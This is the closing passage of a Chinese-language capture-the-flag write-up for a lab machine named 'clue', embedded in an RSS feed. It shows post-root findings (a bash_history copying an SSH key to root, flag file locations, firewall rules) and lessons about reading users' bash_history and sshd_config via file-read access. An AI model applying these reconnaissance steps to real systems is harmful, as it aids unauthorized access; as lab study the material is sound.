&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;竟然成功了。。。 拿到root后也很迷，找了一圈后在anthony的bash_history里发现：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:/home/anthony# cat .bash_history
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;anthony把自己的凭证复制到了root下 （&lt;strong&gt;?&lt;/strong&gt; 疑惑）&lt;/p&gt;
&lt;p&gt;在root下可以找到proof.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;615&#34; height=&#34;56&#34; src=&#34;../legacy/uploads/2025/04/1745590192-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1374&#34; srcset=&#34;../legacy/uploads/2025/04/1745590192-image.png 615w, ../legacy/uploads/2025/04/1745590192-image-300x27.png 300w&#34; sizes=&#34;auto, (max-width: 615px) 100vw, 615px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在/var/lib/freeswitch下可以找到local.txt&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:~# find / -name local.txt -type f
/var/lib/freeswitch/local.txt
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，在防火墙设置下可以看到，确实block了除已开放端口外的数据流入流出：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
root@clue:~# sudo iptables -L -n -v
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 1922  220K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
38959 5695K ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW,RELATED,ESTABLISHED
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
    1    40 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:445
   14   560 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000
    2    80 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
    0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           
&lt;p&gt;Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination&lt;/p&gt;
&lt;p&gt;Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination      &lt;br&gt;
1928  220K ACCEPT     all  &amp;ndash;  *      lo      0.0.0.0/0            0.0.0.0/0        &lt;br&gt;
277 46895 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:22 state NEW,ESTABLISHED
0     0 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53 state NEW,ESTABLISHED
98  6566 ACCEPT     udp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53 state NEW,ESTABLISHED
36906   16M ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:80 state NEW,ESTABLISHED
0     0 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 state NEW,ESTABLISHED
49 10394 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:445 state NEW,ESTABLISHED
4   224 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:139 state NEW,ESTABLISHED
449  114K ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:3000 state NEW,ESTABLISHED
47 46823 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:3000 state NEW,ESTABLISHED
51  4082 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp spt:8021 state NEW,ESTABLISHED
25  4574 ACCEPT     tcp  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8021 state NEW,ESTABLISHED
0     0 ACCEPT     icmp &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8
11   848 ACCEPT     icmp &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 0
238 19369 DROP       all  &amp;ndash;  *      *       0.0.0.0/0            0.0.0.0/0&lt;/p&gt;
&lt;p&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;what-i-have-learned&#34;&gt;What I have learned
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    在有可以任意读取文件的能力时，尝试获取每个用户home下的bash_history文件。
  &lt;/li&gt;
  &lt;li&gt;
    可以读取文件时，永远要记得查看/etc/ssh/sshd_config, 里面记录着哪些用户允许ssh登录。
  &lt;/li&gt;
&lt;/ul&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;687&#34; height=&#34;296&#34; src=&#34;../legacy/uploads/2025/04/1745590747-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1381&#34; srcset=&#34;../legacy/uploads/2025/04/1745590747-image.png 687w, ../legacy/uploads/2025/04/1745590747-image-300x129.png 300w&#34; sizes=&#34;auto, (max-width: 687px) 100vw, 687px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
